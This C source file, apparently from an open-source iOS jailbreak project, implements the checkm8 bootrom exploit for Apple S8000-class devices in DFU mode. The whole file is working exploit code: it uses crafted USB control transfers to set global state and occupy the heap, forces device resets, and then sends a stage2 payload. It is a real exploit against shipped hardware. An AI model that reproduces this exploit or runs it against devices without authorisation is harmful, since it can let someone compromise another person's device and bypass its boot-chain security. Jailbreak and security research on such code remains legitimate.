/*
 * checkra1n_s8000.c
 *
 * Copyright (c) 2021 dora2ios
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include <iousb.h>
#include <checkra1n_common.h>

static unsigned char blank[2048];

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', 2048);
    
    val = 704; // s8000
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) != 0x40){
        i++;
        DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
        usleep(10000);
        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 64);
        DEBUGLOG("[%s] (*) %x", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    DEBUGLOG("[%s] (1/3) val: %x", __FUNCTION__, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    // over1 = dummy
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
    DEBUGLOG("[%s] (1/2) %x", __FUNCTION__, result.ret);
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (2/2) %x", __FUNCTION__, result.ret);
}

int checkra1n_s8000(io_client_t client, uint16_t cpid, checkra1n_payload_t payload)
{
    int r;
    IOReturn res;
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
    usleep(1000);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    res = io_reset(client);
    //if(res != kIOReturnSuccess){
    //    ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
    //    io_close(client);
    //    client = NULL;
    //    return -1;
    //}
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client, cpid, payload);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] sending stage2 payload", __FUNCTION__);
    r = payload_stage2(client, cpid, payload);
    if(r != 0){
        return -1;
    }
    
    r = connect_to_stage2(client, cpid, payload);
    if(r != 0){
        return -1;
    }
    
    return 0;
}
